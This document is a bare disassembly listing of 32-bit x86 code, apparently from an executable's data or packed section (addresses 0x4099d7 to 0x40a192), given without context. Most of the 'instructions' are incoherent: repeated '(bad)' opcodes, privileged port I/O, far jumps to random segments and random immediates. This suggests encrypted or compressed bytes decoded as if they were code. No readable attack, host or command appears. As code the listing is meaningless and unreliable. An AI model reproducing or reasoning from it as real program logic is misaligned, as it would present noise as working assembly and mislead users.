  4099d7:	pushf  
  4099d8:	pushf  
  4099d9:	std    
  4099da:	(bad)  
  4099db:	lahf   
  4099dc:	(bad)  
  4099dd:	popf   
  4099de:	inc    eax
  4099df:	dec    esp
  4099e0:	fcom   QWORD PTR ds:0x38da194
  4099e6:	mov    edx,0x8a444627
  4099eb:	popa   
  4099ec:	inc    eax
  4099ed:	sub    ebp,edx
  4099ef:	and    eax,DWORD PTR [esi]
  4099f1:	mov    ch,0x17
  4099f3:	push   eax
  4099f4:	lock pop ebx
  4099f6:	push   esi
  4099f7:	aas    
  4099f8:	xlat   BYTE PTR ds:[ebx]
  4099f9:	sahf   
  4099fa:	out    dx,al
  4099fb:	mov    al,ds:0x7509ed43
  409a00:	mov    dh,0xc2
  409a02:	sub    ch,BYTE PTR [ebx]
  409a04:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a06:	fld    QWORD PTR [ecx+0x574d4e]
  409a0c:	mov    dl,0xb4
  409a0e:	(bad)  
  409a0f:	fmul   QWORD PTR [eax+0x11]
  409a12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a13:	jmp    0xd843e693
  409a18:	xor    BYTE PTR [esi-0x1c8ccdca],ah
  409a1e:	nop
  409a1f:	je     0x4099eb
  409a21:	dec    ebx
  409a22:	dec    esp
  409a23:	xor    ebp,DWORD PTR [esi]
  409a25:	push   0xffffffec
  409a27:	outs   dx,DWORD PTR ds:[esi]
  409a28:	xchg   ebx,eax
  409a29:	dec    edi
  409a2a:	push   0x7d
  409a2c:	or     esi,DWORD PTR [ebp-0x10]
  409a2f:	mov    eax,ds:0x3c5a7966
  409a34:	outs   dx,BYTE PTR ds:[esi]
  409a35:	jp     0x409a80
  409a37:	push   ecx
  409a38:	lahf   
  409a39:	fsub   st,st(2)
  409a3b:	push   cs
  409a3c:	jb     0x409a60
  409a3e:	mov    ebx,0x87af0684
  409a43:	shl    BYTE PTR [ebp-0x3bfb6beb],1
  409a49:	imul   edi,DWORD PTR [ecx+0x467b1172],0x789976af
  409a53:	xchg   ebp,eax
  409a54:	in     eax,0x1e
  409a56:	fs stos DWORD PTR es:[edi],eax
  409a58:	jbe    0x409abd
  409a5a:	std    
  409a5b:	sbb    edi,ecx
  409a5d:	xchg   esp,eax
  409a5e:	imul   edi,eax,0xe5a289af
  409a64:	sbb    eax,0xffb7e01e
  409a69:	arpl   WORD PTR [ecx+0x77f3d215],si
  409a6f:	mov    eax,ds:0x34bb9879
  409a74:	sbb    BYTE PTR [eax+0x8151fb2],ch
  409a7a:	fstp   DWORD PTR ds:0x7c71fc4a
  409a80:	and    al,0xe
  409a82:	xchg   BYTE PTR [edx+0x1034d97c],cl
  409a88:	xor    eax,0x57992f98
  409a8d:	inc    edx
  409a8e:	mov    al,ds:0x1e96c44a
  409a93:	mov    dl,0x3d
  409a95:	pop    ebp
  409a96:	out    0x15,eax
  409a98:	push   edi
  409a99:	fsub   DWORD PTR [esi-0x644d5e69]
  409a9f:	sar    BYTE PTR [edx-0x68e60d1e],1
  409aa5:	retf   
  409aa6:	add    BYTE PTR [edi-0x62],ch
  409aa9:	ss es jl 0x409a2d
  409aad:	imul   ecx,DWORD PTR [esi-0x31],0xffffffcb
  409ab1:	sub    ch,BYTE PTR [edx]
  409ab3:	into   
  409ab4:	mov    esp,0xaafcbc2a
  409ab9:	loope  0x409a9a
  409abb:	jge    0x409b32
  409abd:	adc    al,0xfb
  409abf:	(bad)  
  409ac0:	repz aad 0xde
  409ac3:	push   cs
  409ac4:	sub    esp,ebx
  409ac6:	adc    ecx,DWORD PTR fs:[edx+edi*2-0x68580353]
  409ace:	int    0x3a
  409ad0:	jg     0x409ae4
  409ad2:	loop   0x409a63
  409ad4:	mov    DWORD PTR [edi],esp
  409ad6:	mov    ds:0xc435e2cc,eax
  409adb:	ret    0xc712
  409ade:	add    esi,DWORD PTR [ebx+edi*4-0x73]
  409ae2:	pop    ss
  409ae3:	iret   
  409ae4:	push   ecx
  409ae5:	cmp    DWORD PTR [edi],0xbcf85913
  409aeb:	iret   
  409aec:	shl    al,0xaf
  409aef:	mov    al,0x68
  409af1:	in     eax,dx
  409af2:	(bad)  
  409af3:	cli    
  409af4:	pop    ebp
  409af5:	xchg   ebx,eax
  409af6:	loope  0x409b30
  409af8:	in     al,dx
  409af9:	aas    
  409afa:	aas    
  409afb:	sbb    edi,edx
  409afd:	and    al,0x8a
  409aff:	fnstenv [ebx+ebx*2+0x22]
  409b03:	arpl   ax,si
  409b05:	les    ebp,FWORD PTR [edx]
  409b07:	mov    dl,0x73
  409b09:	inc    edx
  409b0a:	aam    0x61
  409b0c:	or     BYTE PTR [esi-0x27f1ed42],dh
  409b12:	mov    cl,0x98
  409b14:	mov    ah,0x2
  409b16:	es inc ecx
  409b18:	call   0x2a509271
  409b1d:	data16 lahf 
  409b1f:	stos   DWORD PTR es:[edi],eax
  409b20:	imul   ecx,edi,0x5b7308a5
  409b26:	sbb    al,0xcb
  409b28:	arpl   WORD PTR [eax-0x23],dx
  409b2b:	sbb    al,0x7e
  409b2d:	(bad)  
  409b2e:	mov    cl,0x5b
  409b30:	repnz imul esp,DWORD PTR [edi+0x3b],0x823473a7
  409b38:	mov    ebx,ebx
  409b3a:	or     eax,0x2d620e22
  409b3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b40:	mov    edx,0xd55c782f
  409b45:	adc    al,0x31
  409b47:	xor    dh,ah
  409b49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b4a:	data16 loop 0x409b20
  409b4d:	add    BYTE PTR [eax],bl
  409b4f:	(bad)  
  409b50:	js     0x409add
  409b52:	rep ins BYTE PTR es:[edi],dx
  409b54:	fwait
  409b55:	dec    esp
  409b56:	inc    di
  409b58:	cli    
  409b59:	cwde   
  409b5a:	mov    edx,0xa397ec7c
  409b5f:	sahf   
  409b60:	mov    edx,0x5be7e594
  409b65:	and    DWORD PTR [eax-0x12],ebx
  409b68:	enter  0xa1b5,0x40
  409b6c:	dec    esi
  409b6d:	clc    
  409b6e:	fcmovnbe st,st(0)
  409b70:	inc    esi
  409b71:	dec    ebx
  409b72:	and    eax,0xf1b53980
  409b77:	adc    dl,al
  409b79:	out    0x12,eax
  409b7b:	mov    edi,DWORD PTR [ebx-0x57a57c78]
  409b81:	and    BYTE PTR [ecx],dh
  409b83:	cli    
  409b84:	or     ch,BYTE PTR [esi+edx*4+0x1a]
  409b88:	pop    edx
  409b89:	jl     0x409b7f
  409b8b:	stos   DWORD PTR es:[edi],eax
  409b8c:	outs   dx,DWORD PTR ds:[esi]
  409b8d:	push   edx
  409b8e:	adc    al,BYTE PTR [esp+eax*1]
  409b91:	shl    BYTE PTR [edi+0x64026a52],cl
  409b97:	fld    DWORD PTR [ebx-0x6c]
  409b9a:	dec    edx
  409b9b:	icebp  
  409b9c:	aad    0xc5
  409b9e:	div    edi
  409ba0:	sbb    eax,0xb915286
  409ba5:	mul    bh
  409ba7:	ins    BYTE PTR es:[edi],dx
  409ba8:	jns    0x409ba8
  409baa:	xchg   esp,eax
  409bab:	and    al,0xd
  409bad:	inc    esp
  409bae:	(bad)  
  409baf:	sbb    DWORD PTR [edi],ebx
  409bb1:	loopne 0x409bb0
  409bb3:	jne    0x409b3c
  409bb5:	fstp   TBYTE PTR [esi]
  409bb7:	sub    ebx,DWORD PTR [edi-0x68]
  409bba:	adc    ecx,edx
  409bbc:	stos   BYTE PTR es:[edi],al
  409bbd:	sbb    BYTE PTR [eax-0x115d4f6c],dh
  409bc3:	ss (bad) 
  409bc5:	cmc    
  409bc6:	leave  
  409bc7:	cmp    al,0x7d
  409bc9:	data16 mov dl,0x92
  409bcc:	pinsrw mm0,WORD PTR [edx],0x66
  409bd0:	test   al,0x46
  409bd2:	cmp    edi,DWORD PTR [ebp-0x65]
  409bd5:	idiv   esi
  409bd7:	cmc    
  409bd8:	in     eax,0x7b
  409bda:	lahf   
  409bdb:	and    BYTE PTR [esi+0x29d9bc54],0x59
  409be2:	mov    eax,ds:0x7ba6d94b
  409be7:	xor    BYTE PTR [edx+0x25930af0],0x44
  409bee:	cmp    eax,0xe930eb35
  409bf3:	xchg   DWORD PTR [eax+0x12],eax
  409bf6:	cmp    DWORD PTR [ecx],eax
  409bf8:	mov    cl,ah
  409bfa:	retf   0xc584
  409bfd:	mov    ebx,0x15873948
  409c02:	add    DWORD PTR [esi+esi*2-0x17de81a7],edx
  409c09:	push   0x1861a0a
  409c0e:	or     DWORD PTR [edx+0x61084bdc],ebp
  409c14:	shr    ah,1
  409c16:	jnp    0x409bc1
  409c18:	aaa    
  409c19:	rcr    DWORD PTR [ebx+0x6f],0x59
  409c1d:	cmp    eax,0x1276c556
  409c22:	imul   edi,DWORD PTR [edi],0x285ce560
  409c28:	push   0x120d25e7
  409c2d:	mov    dh,0x33
  409c2f:	mov    ecx,0xb0c7acc7
  409c34:	into   
  409c35:	dec    ebp
  409c36:	jmp    0x531a3551
  409c3b:	jp     0x409c99
  409c3d:	outs   dx,BYTE PTR ds:[esi]
  409c3e:	sub    DWORD PTR [edx+0x1c3d1f85],0x31
  409c45:	mov    al,ds:0x72d5476e
  409c4a:	xchg   edi,eax
  409c4b:	mov    edi,0xe458b9af
  409c50:	pop    es
  409c51:	jb     0x409bd8
  409c53:	dec    ecx
  409c54:	mov    bh,0x4d
  409c56:	adc    al,0x36
  409c58:	pop    edi
  409c59:	or     eax,0xdeb3f6d3
  409c5e:	add    cx,si
  409c61:	retf   0x9cd1
  409c64:	and    BYTE PTR [ebp+0x31],cl
  409c67:	xchg   edi,eax
  409c68:	(bad)  
  409c69:	push   ebp
  409c6a:	mov    eax,DWORD PTR [ecx+0x74cac46f]
  409c70:	ss ss inc edx
  409c73:	jmp    0x9afa7e74
  409c78:	retf   0xd890
  409c7b:	xchg   esi,eax
  409c7c:	xchg   edi,eax
  409c7d:	sahf   
  409c7e:	mov    esp,0x6f32c9f5
  409c83:	push   ds
  409c84:	jnp    0x409cc8
  409c86:	aad    0x59
  409c88:	daa    
  409c89:	shl    bh,0x45
  409c8c:	jne    0x409c89
  409c8e:	cs mov bh,cl
  409c91:	xchg   ebp,eax
  409c92:	dec    edx
  409c93:	and    BYTE PTR [esi],bl
  409c95:	rol    DWORD PTR [ebx-0x7b],cl
  409c98:	adc    DWORD PTR [esi-0xd245fb9],ebp
  409c9e:	ror    DWORD PTR [ebp+0x1f],cl
  409ca1:	in     eax,0x2e
  409ca3:	jecxz  0x409cd0
  409ca5:	into   
  409ca6:	jnp    0x409c43
  409ca8:	pop    edx
  409ca9:	inc    edx
  409caa:	fst    DWORD PTR ds:0x6a4f037e
  409cb0:	sahf   
  409cb1:	jbe    0x409d0f
  409cb3:	push   ss
  409cb4:	jge    0x409c9c
  409cb6:	mov    BYTE PTR [eax+0x68],cl
  409cb9:	push   ecx
  409cba:	jmp    0x4d0b7d7e
  409cbf:	or     al,0x97
  409cc1:	push   edx
  409cc2:	jne    0x409d25
  409cc4:	xchg   DWORD PTR [ebx],ebx
  409cc6:	rcr    DWORD PTR [edx-0x36],cl
  409cc9:	call   0xef3d17de
  409cce:	repz sub bl,BYTE PTR [esi+0x6a59c5ea]
  409cd5:	inc    edi
  409cd6:	push   ecx
  409cd7:	sbb    DWORD PTR [ebx+0x21e7d8],ebp
  409cdd:	in     eax,dx
  409cde:	out    dx,eax
  409cdf:	xor    eax,0xfae63da2
  409ce4:	imul   edi,DWORD PTR [ebx+0x3d],0xffffff94
  409ce8:	stc    
  409ce9:	js     0x409c76
  409ceb:	leave  
  409cec:	cmp    al,BYTE PTR [esp+edx*1]
  409cef:	cmp    eax,0xb9144369
  409cf5:	nop
  409cf6:	xor    eax,DWORD PTR [ebx]
  409cf8:	call   0xdbe9c695
  409cfd:	nop
  409cfe:	mov    esi,0xd3e996b7
  409d03:	mov    ?,WORD PTR [eax-0x1a]
  409d06:	sbb    DWORD PTR cs:[eax],edi
  409d09:	dec    esi
  409d0a:	ret    0x2332
  409d0d:	adc    BYTE PTR [esp+ebx*8],0x6b
  409d11:	ja     0x409cd5
  409d13:	jge    0x409cb7
  409d15:	inc    ebx
  409d16:	out    dx,eax
  409d17:	pop    ecx
  409d18:	les    edx,FWORD PTR [eax]
  409d1a:	in     al,dx
  409d1b:	pop    ecx
  409d1c:	int3   
  409d1d:	mov    al,0x8b
  409d1f:	stc    
  409d20:	pop    ecx
  409d21:	jmp    0x6235:0x825c0a36
  409d28:	int3   
  409d29:	test   eax,0xb5267510
  409d2e:	les    edi,FWORD PTR ds:[edx+0x3]
  409d32:	cmc    
  409d33:	add    al,0x68
  409d35:	ds out 0x78,eax
  409d38:	or     edi,DWORD PTR [eax+0x31]
  409d3b:	test   esp,edx
  409d3d:	pop    edx
  409d3e:	mov    eax,0xdf00a3e5
  409d43:	xchg   edx,eax
  409d44:	push   ebp
  409d45:	pop    ds
  409d46:	push   edx
  409d47:	cwde   
  409d48:	not    BYTE PTR [esp+esi*1]
  409d4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d4c:	test   eax,0xe2fd53f9
  409d51:	mov    edx,0x284ed9d5
  409d56:	push   edx
  409d57:	adc    BYTE PTR [ebx-0x6],dl
  409d5a:	aad    0xf5
  409d5c:	mov    cl,0x54
  409d5e:	dec    eax
  409d5f:	leave  
  409d60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d61:	mov    ch,0x32
  409d63:	sub    eax,0x332e34f4
  409d68:	repnz add BYTE PTR fs:[eax+edi*4-0x7f042f7],dh
  409d71:	mov    dh,dh
  409d73:	jmp    0x75f94742
  409d78:	les    eax,FWORD PTR ds:0xf5f2ace5
  409d7e:	push   ss
  409d7f:	fisub  DWORD PTR [esi+0x6c5c2ab4]
  409d85:	jle    0x409d5f
  409d87:	push   cs
  409d88:	(bad)  
  409d89:	jecxz  0x409da5
  409d8b:	ret    
  409d8c:	dec    eax
  409d8d:	fild   QWORD PTR [eax]
  409d8f:	ins    DWORD PTR es:[edi],dx
  409d90:	daa    
  409d91:	in     eax,dx
  409d92:	adc    eax,eax
  409d94:	lods   al,BYTE PTR ds:[esi]
  409d95:	enter  0x7933,0x7c
  409d99:	test   DWORD PTR ds:0xd002166c,esi
  409d9f:	loop   0x409dcb
  409da1:	in     eax,dx
  409da2:	mov    bh,0x8a
  409da4:	cmp    al,BYTE PTR [esi+ebx*8+0x600f6e27]
  409dab:	adc    DWORD PTR [esi],0x1507deb0
  409db1:	hlt    
  409db2:	es out dx,eax
  409db4:	sbb    BYTE PTR ds:0x63fad088,dl
  409dba:	sbb    BYTE PTR [eax-0x26d67085],ch
  409dc0:	scas   eax,DWORD PTR es:[edi]
  409dc1:	mov    ds:0x1adb3899,eax
  409dc6:	mov    bh,0xc7
  409dc8:	add    DWORD PTR [ebp+0xfc27e56],edi
  409dce:	sti    
  409dcf:	stos   BYTE PTR es:[edi],al
  409dd0:	je     0x409dc3
  409dd2:	add    ah,BYTE PTR [ecx+0x5bc3d9a6]
  409dd8:	and    dh,BYTE PTR [eax+0x1b]
  409ddb:	push   cs
  409ddc:	add    al,0x38
  409dde:	jmp    FWORD PTR [eax-0x5f]
  409de1:	icebp  
  409de2:	or     BYTE PTR [ebx],ah
  409de4:	jle    0x409df3
  409de6:	shr    DWORD PTR [eax],0xca
  409de9:	mov    ds:0xedfd2285,al
  409dee:	push   ebp
  409def:	sbb    al,0x96
  409df1:	xor    al,0xf8
  409df3:	pop    esp
  409df4:	jg     0x409e12
  409df6:	pop    esi
  409df7:	aad    0x87
  409df9:	push   bx
  409dfb:	popf   
  409dfc:	inc    edi
  409dfd:	shl    BYTE PTR [edi],1
  409dff:	mov    ah,0x2d
  409e01:	add    edi,DWORD PTR [edi-0x1]
  409e04:	sti    
  409e05:	add    al,0x0
  409e07:	jl     0x409e7a
  409e09:	push   ecx
  409e0a:	leave  
  409e0b:	dec    eax
  409e0c:	push   esi
  409e0d:	jmp    0x409e34
  409e0f:	xor    edi,eax
  409e11:	mov    eax,0x2f5f57d9
  409e16:	jnp    0x409e47
  409e18:	shl    BYTE PTR [ebx-0x491bc8d6],cl
  409e1e:	pop    edi
  409e1f:	pop    ecx
  409e20:	mov    ecx,0x1c7f2309
  409e25:	sub    BYTE PTR [esi+0x21],al
  409e28:	sbb    DWORD PTR [ecx+0xf],ecx
  409e2b:	jle    0x409e33
  409e2d:	dec    eax
  409e2e:	dec    eax
  409e2f:	shr    DWORD PTR ds:[edi-0x55c2299d],0x11
  409e37:	or     cl,al
  409e39:	inc    ebp
  409e3a:	adc    edi,DWORD PTR [edi-0x2a]
  409e3d:	sbb    bh,al
  409e3f:	out    0x21,al
  409e41:	or     esp,esi
  409e43:	xchg   DWORD PTR [edx-0x5b],ebx
  409e46:	push   edi
  409e47:	cli    
  409e48:	push   ebp
  409e49:	cld    
  409e4a:	inc    edi
  409e4b:	(bad)  
  409e4c:	aad    0xd3
  409e4e:	sar    bl,0xea
  409e51:	xchg   esp,eax
  409e52:	cmc    
  409e53:	daa    
  409e54:	inc    edi
  409e55:	ret    
  409e56:	dec    ecx
  409e57:	fsub   DWORD PTR [edx]
  409e59:	jmp    0x409e15
  409e5b:	push   0x7dd64600
  409e60:	(bad)
  409e63:	shl    BYTE PTR [bp-0x1c],0xa9
  409e68:	or     edi,eax
  409e6a:	out    0x75,eax
  409e6c:	inc    esp
  409e6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e6f:	adc    BYTE PTR [ecx],0xb2
  409e72:	pop    edx
  409e73:	push   es
  409e74:	repz mov es,esi
  409e77:	inc    esi
  409e78:	nop
  409e79:	mov    al,ds:0x1554fa82
  409e7e:	fisubr DWORD PTR [ebp-0x7]
  409e81:	cmp    DWORD PTR [ecx-0x2fde34dc],ecx
  409e87:	pop    edi
  409e88:	add    ch,BYTE PTR [ecx-0x62ba6fb3]
  409e8e:	push   esp
  409e8f:	adc    eax,0xbaa39b07
  409e94:	sar    DWORD PTR [esi-0x3bd598a9],1
  409e9a:	outs   dx,BYTE PTR ds:[esi]
  409e9b:	test   DWORD PTR gs:[edi],esi
  409e9e:	xchg   bl,dh
  409ea0:	int3   
  409ea1:	cmp    al,0x61
  409ea3:	xor    BYTE PTR [ebx+eiz*4-0x47352758],bl
  409eaa:	mov    eax,0x96d1a198
  409eaf:	ror    DWORD PTR [eax+ebx*4-0x2d925e56],0x2a
  409eb7:	leave  
  409eb8:	inc    bh
  409eba:	add    eax,0x66bbb95b
  409ebf:	dec    esi
  409ec0:	and    eax,0x7930ef7f
  409ec5:	jae    0x409e9f
  409ec7:	aas    
  409ec8:	imul   eax,DWORD PTR [ecx],0xffffff84
  409ecb:	fsubr  DWORD PTR [edx]
  409ecd:	cdq    
  409ece:	push   es
  409ecf:	sub    DWORD PTR [edi],0x1e8f7ffa
  409ed5:	push   esp
  409ed6:	pop    edx
  409ed7:	ins    DWORD PTR es:[edi],dx
  409ed8:	jmp    0x8e75:0xe0a91240
  409edf:	or     esi,DWORD PTR [ebp-0x3e]
  409ee2:	cdq    
  409ee3:	ret    
  409ee4:	push   edx
  409ee5:	clc    
  409ee6:	sbb    bl,dh
  409ee8:	add    ch,al
  409eea:	dec    esi
  409eeb:	sbb    BYTE PTR ds:0x89912fde,al
  409ef1:	sub    eax,DWORD PTR [ecx]
  409ef3:	push   ebp
  409ef4:	inc    esp
  409ef5:	mov    ch,0xb6
  409ef7:	add    ebx,DWORD PTR [edx]
  409ef9:	pop    ecx
  409efa:	jb     0x409f39
  409efc:	xor    BYTE PTR [ebp+0x685c1642],dl
  409f02:	hlt    
  409f03:	mov    ch,0xea
  409f05:	lahf   
  409f06:	push   esp
  409f07:	outs   dx,DWORD PTR ds:[esi]
  409f08:	ins    BYTE PTR es:[edi],dx
  409f09:	mov    BYTE PTR [ecx-0x5aa36b01],ch
  409f0f:	retf   0x891b
  409f12:	sbb    eax,0xded7ffe3
  409f17:	sbb    edx,ebp
  409f19:	or     eax,0xcc63cba
  409f1e:	mov    al,ds:0x4bc63f78
  409f24:	and    eax,0x68ea64b1
  409f29:	add    al,0x19
  409f2b:	arpl   WORD PTR [edi+ecx*8+0x5b],si
  409f2f:	stos   BYTE PTR es:[edi],al
  409f30:	jge    0x409f9c
  409f32:	jmp    0xefca4de
  409f37:	dec    ebp
  409f38:	inc    esp
  409f39:	jmp    0x409f7f
  409f3b:	jp     0x409ee6
  409f3d:	js     0x409f41
  409f3f:	sbb    eax,0x5de04456
  409f44:	popf   
  409f45:	pop    ebx
  409f46:	mov    ch,0x77
  409f48:	inc    eax
  409f49:	and    eax,0x7663afa0
  409f4e:	enter  0x970c,0xeb
  409f52:	dec    edi
  409f53:	push   ebx
  409f54:	retf   
  409f55:	push   esi
  409f56:	(bad)  
  409f57:	shl    DWORD PTR [eax-0x16],0x79
  409f5b:	inc    ebx
  409f5c:	aaa    
  409f5d:	push   ebp
  409f5e:	adc    dh,ch
  409f60:	mov    al,0x83
  409f62:	xchg   esp,eax
  409f63:	(bad)  
  409f64:	out    0xcb,eax
  409f66:	inc    esi
  409f67:	or     BYTE PTR [edx],cl
  409f69:	ret    0xfbd8
  409f6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f6d:	pop    eax
  409f6e:	popa   
  409f6f:	inc    edx
  409f70:	jne    0x409f97
  409f72:	mov    ch,0xc
  409f74:	mov    esp,DWORD PTR [esi+edx*1]
  409f77:	xchg   DWORD PTR [edi],ecx
  409f79:	imul   eax,DWORD PTR [edx+eax*1+0xb],0x63
  409f7e:	sti    
  409f7f:	scas   al,BYTE PTR es:[edi]
  409f80:	mov    edx,esp
  409f82:	or     cl,BYTE PTR [esi-0x11]
  409f85:	in     al,dx
  409f86:	jl     0x409f81
  409f88:	int3   
  409f89:	jg     0x409fba
  409f8b:	arpl   di,di
  409f8d:	data16 fld TBYTE PTR [ebx-0x6fe03c2f]
  409f94:	push   edx
  409f95:	jno    0x409ffb
  409f97:	mov    ebx,0x1a43b110
  409f9c:	(bad)  
  409f9e:	mov    dl,0x72
  409fa0:	inc    edx
  409fa1:	mov    bh,0xee
  409fa3:	mov    ds:0x9e61af16,eax
  409fa8:	add    ch,dl
  409faa:	jbe    0x40a013
  409fac:	mov    ebp,0xb3fc9978
  409fb1:	es jg  0x409fd8
  409fb4:	mov    bh,0x10
  409fb6:	addr16 test al,0xdb
  409fb9:	sbb    al,0xe3
  409fbb:	(bad)  
  409fbc:	jbe    0x40a033
  409fbe:	cdq    
  409fbf:	(bad)  
  409fc1:	xor    dh,BYTE PTR [edx-0x38]
  409fc4:	or     BYTE PTR ds:0xd98172df,0xc6
  409fcb:	dec    edx
  409fcc:	sub    DWORD PTR [esi],ecx
  409fce:	fucom  st(1)
  409fd0:	fbld   TBYTE PTR [edx-0x649c1a56]
  409fd6:	pushf  
  409fd7:	and    eax,0xeda0701
  409fdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fdd:	js     0x409fc6
  409fdf:	ins    BYTE PTR es:[edi],dx
  409fe0:	mov    dl,0xb3
  409fe2:	or     BYTE PTR [esi-0x71d908e7],cl
  409fe8:	jl     0x40a060
  409fea:	adc    eax,0x3d83538d
  409fef:	es and al,0xc5
  409ff2:	add    eax,0x25950f1d
  409ff7:	in     al,0x7e
  409ff9:	dec    ebx
  409ffa:	loopne 0x40a056
  409ffc:	push   ds
  409ffd:	cmp    cl,BYTE PTR [ecx-0x662c7df3]
  40a003:	push   ss
  40a004:	jl     0x40a043
  40a006:	inc    ebp
  40a007:	retf   
  40a008:	aas    
  40a009:	push   esp
  40a00a:	pop    ecx
  40a00b:	clc    
  40a00c:	mov    dh,BYTE PTR [edi-0x203167f5]
  40a012:	int    0xbd
  40a014:	sbb    eax,0x86bb24a5
  40a019:	aas    
  40a01a:	mov    BYTE PTR [esi],cl
  40a01c:	mov    ch,BYTE PTR [ebx-0x77]
  40a01f:	loop   0x409fc7
  40a021:	mov    bl,al
  40a023:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a024:	and    al,0x90
  40a026:	pop    esp
  40a027:	mov    ds:0xcabe701c,eax
  40a02c:	sbb    dl,cl
  40a02e:	lock pushf 
  40a030:	mov    al,0x71
  40a032:	js     0x40a042
  40a034:	mov    ecx,0xccc0848f
  40a039:	call   0xfd6281f3
  40a03e:	out    dx,eax
  40a03f:	(bad)  
  40a040:	call   0xfae70303
  40a045:	xchg   edx,eax
  40a046:	inc    edi
  40a047:	xchg   edi,eax
  40a048:	sub    BYTE PTR [eax-0x777b6fc2],ah
  40a04e:	loopne 0x40a06c
  40a050:	adc    DWORD PTR ds:0xd361d45e,eax
  40a056:	retf   
  40a057:	mov    cl,0xbf
  40a059:	shl    DWORD PTR [edx+edx*4+0x4bac1bf8],1
  40a060:	cmp    eax,0x278a046a
  40a065:	lods   al,BYTE PTR ds:[esi]
  40a066:	in     al,dx
  40a067:	loopne 0x40a0be
  40a069:	shl    bl,1
  40a06b:	jbe    0x40a0d1
  40a06d:	push   eax
  40a06e:	pop    ebx
  40a06f:	push   eax
  40a070:	mov    DWORD PTR [edx],edi
  40a072:	and    eax,0xc5f4df1a
  40a077:	mov    ebp,0xa5799b12
  40a07c:	and    DWORD PTR ds:0x24e922dc,0xf84dab34
  40a086:	mov    bl,0x3e
  40a088:	add    al,0xae
  40a08a:	rcl    bl,cl
  40a08c:	hlt    
  40a08d:	jge    0x40a06a
  40a08f:	ret    
  40a090:	mov    ds:0xb44a2a01,eax
  40a095:	test   BYTE PTR ds:0x77f5a43a,dl
  40a09b:	jp     0x40a023
  40a09d:	sub    al,0xbc
  40a09f:	cmp    BYTE PTR [edx],bl
  40a0a1:	ja     0x40a066
  40a0a3:	dec    ebp
  40a0a4:	sub    al,0xae
  40a0a7:	lahf   
  40a0a8:	daa    
  40a0a9:	push   ebx
  40a0aa:	pop    ds
  40a0ab:	or     ebp,DWORD PTR [ecx+0x2f]
  40a0ae:	cld    
  40a0af:	pop    edi
  40a0b0:	inc    ebx
  40a0b1:	jg     0x40a095
  40a0b3:	leave  
  40a0b4:	rol    al,0x30
  40a0b7:	sar    DWORD PTR [ebx+0x7c],1
  40a0ba:	add    esi,DWORD PTR [esi]
  40a0bc:	xchg   esp,eax
  40a0bd:	jge    0x40a106
  40a0bf:	lods   eax,DWORD PTR ds:[esi]
  40a0c0:	jno    0x40a0a6
  40a0c2:	jl     0x40a132
  40a0c4:	call   0x758511f4
  40a0c9:	sbb    dh,BYTE PTR [esi+0x1f]
  40a0cc:	pop    esi
  40a0cd:	(bad)  
  40a0ce:	aas    
  40a0cf:	addr16 push es
  40a0d1:	inc    ebp
  40a0d2:	sub    eax,0xe9eabda
  40a0d7:	pop    ds
  40a0d8:	imul   ebp,DWORD PTR [eax+0x3a94ebe8],0x22
  40a0df:	or     BYTE PTR [edx],dh
  40a0e1:	aam    0x83
  40a0e3:	add    eax,0x88a98df7
  40a0e8:	pusha  
  40a0e9:	mov    dl,0x38
  40a0eb:	aaa    
  40a0ec:	(bad)  
  40a0ed:	rcl    BYTE PTR [edi],1
  40a0ef:	cli    
  40a0f0:	sub    BYTE PTR [edi],dh
  40a0f2:	jl     0x40a0a8
  40a0f4:	fmulp  st(6),st
  40a0f6:	or     al,0x2a
  40a0f8:	jge    0x40a0c2
  40a0fa:	bnd jae 0x40a131
  40a0fd:	mov    WORD PTR [eax-0x5674f7da],?
  40a103:	ja     0x40a0c8
  40a105:	xor    eax,0x70c516bf
  40a10a:	ret    
  40a10b:	shl    DWORD PTR [edx+eiz*4-0x29],0x4d
  40a110:	int3   
  40a111:	stos   BYTE PTR es:[edi],al
  40a112:	push   cs
  40a113:	jne    0x40a167
  40a115:	pop    eax
  40a116:	(bad)  
  40a117:	out    0x5,eax
  40a119:	pushf  
  40a11a:	ins    BYTE PTR es:[edi],dx
  40a11b:	add    BYTE PTR [ebp-0x2b57089a],ch
  40a121:	ins    BYTE PTR es:[edi],dx
  40a122:	test   BYTE PTR [esp+eax*4-0x533ed460],ah
  40a129:	arpl   WORD PTR [edx-0x3745c414],bx
  40a12f:	in     eax,0xb3
  40a131:	xor    DWORD PTR ds:0xb38ee34d,esi
  40a137:	retf   0x8da3
  40a13a:	and    ebx,ebp
  40a13c:	mov    BYTE PTR es:[eax-0x3e702d1],dh
  40a143:	clc    
  40a144:	mov    al,dl
  40a146:	lds    edi,FWORD PTR [ecx]
  40a148:	xchg   DWORD PTR [ebp-0x30],ebx
  40a14b:	or     DWORD PTR [ebx],ebx
  40a14d:	cli    
  40a14e:	in     al,0x7c
  40a150:	and    ch,BYTE PTR [ebx-0xf229b99]
  40a156:	add    al,0xa1
  40a158:	fist   DWORD PTR [ebx+0x76babcdf]
  40a15e:	adc    ecx,DWORD PTR [ecx]
  40a160:	stos   DWORD PTR es:[edi],eax
  40a161:	sar    BYTE PTR [ebx-0x5f4f945],cl
  40a167:	sti    
  40a168:	les    edx,FWORD PTR [ecx-0x72e130b2]
  40a16e:	outs   dx,BYTE PTR ds:[esi]
  40a16f:	pop    ebp
  40a170:	sbb    al,0xa3
  40a172:	lahf   
  40a173:	ins    BYTE PTR es:[edi],dx
  40a174:	cmp    DWORD PTR [edi+eiz*1+0x21cd994d],edx
  40a17b:	sbb    eax,0x7c31202b
  40a180:	mov    ch,0xca
  40a182:	lods   eax,DWORD PTR ds:[esi]
  40a183:	xor    al,BYTE PTR ds:0xaf15de0f
  40a189:	retf   
  40a18a:	xchg   ecx,eax
  40a18b:	cli    
  40a18c:	inc    edi
  40a18d:	sar    ah,0xe1
  40a190:	dec    edi
  40a191:	pop    esi
  40a192:	dec    edx
